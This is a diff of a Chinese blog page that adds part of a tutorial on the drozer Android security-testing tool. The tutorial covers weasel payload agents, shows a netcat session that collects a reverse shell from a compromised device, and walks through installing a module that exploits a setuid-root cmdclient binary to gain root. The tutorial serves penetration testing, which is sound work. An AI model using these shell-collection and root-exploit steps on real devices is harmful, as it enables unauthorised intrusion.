+<h4 id="3-3-1-Full-Agent"><a href="#3-3-1-Full-Agent" class="headerlink" title="3.3.1 Full Agent"></a>3.3.1 Full Agent</h4><p>如果weasel能够安装包，将从完整的drozer代理接收连接。 这与目前使用的代理程序相同，但不会向设备所有者显示GUI。</p>
+<h4 id="３-3-2-Limited-Agent"><a href="#３-3-2-Limited-Agent" class="headerlink" title="３.3.2 Limited Agent"></a>３.3.2 Limited Agent</h4><p>如果weasel无法安装软件包，它仍然可以运行drozer代理的版本。 这是完整代理，但无权访问任何“应用程序上下文”。 这可以防止它直接与运行时的各个部分进行交互，例如程序包管理器，因此无法与其他程序包或其IPC端点进行交互。 如果获得有限代理，drozer将自动隐藏无法运行的模块，从“list”命令.</p>
+<h4 id="3-3-3-Reverse-Shell"><a href="#3-3-3-Reverse-Shell" class="headerlink" title="3.3.3 Reverse Shell"></a>3.3.3 Reverse Shell</h4><p>如果drozer甚至无法执行有限代理，它将为drozer服务器提供正常的Linux shell。<br>可以通过使用netcat连接到服务器来收集这些shell，并发送一行说明</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ nc myserver 31415</span><br><span class="line">COLLECT</span><br><span class="line">drozer Shell Server</span><br><span class="line">-------------------</span><br><span class="line">There is 1 shell waiting...</span><br><span class="line">1) 127.0.0.1:54214</span><br><span class="line">Shell: 1</span><br><span class="line">/system/bin/id</span><br><span class="line">uid=10058(u0_a58) gid=10058(u0_a58) groups=1028(sdcard_r),3003(inet)</span><br></pre></td></tr></table></figure>
+<h2 id="4-Install-Modules"><a href="#4-Install-Modules" class="headerlink" title="4.Install Modules"></a>4.Install Modules</h2><p>drozer提供模块来研究Android平台的各个方面，以及一些远程攻击。<br>可以通过下载和安装其他模块来扩展drozer的功能。</p>
+<h3 id="4-1-Finding-Modules"><a href="#4-1-Finding-Modules" class="headerlink" title="4.1 Finding Modules"></a>4.1 Finding Modules</h3><p>官方drozer模块存储库与Github上的主项目一起托管。 这会自动设置在您的drozer副本中。 可以使用<code>module</code>命令搜索模块：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; module search root</span><br><span class="line">metall0id.root.cmdclient</span><br><span class="line">metall0id.root.exynosmem.exynosmem</span><br><span class="line">metall0id.root.scanner_check</span><br><span class="line">metall0id.root.ztesyncagent</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; module search cmdclient -d</span><br><span class="line">metall0id.root.cmdclient</span><br><span class="line"> Exploit the setuid-root binary at /system/bin/cmdclient on certain devices to gain a</span><br><span class="line"> root shell. Command injection vulnerabilities exist in the parsing mechanisms of the</span><br><span class="line"> various input arguments.</span><br><span class="line"> This exploit has been reported to work on the Acer Iconia, Motorola XYBoard and</span><br><span class="line"> Motorola Xoom FE.</span><br></pre></td></tr></table></figure>
+<h3 id="4-2-Installing-Modules"><a href="#4-2-Installing-Modules" class="headerlink" title="4.2  Installing Modules"></a>4.2  Installing Modules</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; module install cmdclient</span><br><span class="line">Processing metall0id.root.cmdclient... Done.</span><br><span class="line">Successfully installed 1 modules, 0 already installed</span><br></pre></td></tr></table></figure>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果~<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/img/zhifubao.jpeg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/img/weixin.jpeg">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Spider</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://showmeshell.top/2018/09/28/How-to-use-drozer/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/07/22/爬虫一/" class="archive-article-date">
-  	<time datetime="2018-07-22T02:07:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-07-22</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2018/09/27/北京/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">北京</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/07/22/爬虫一/">爬虫一</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Spider</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
   
 
-    
+  
+
+  
 
 
           </div>
@@ -276,9 +553,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
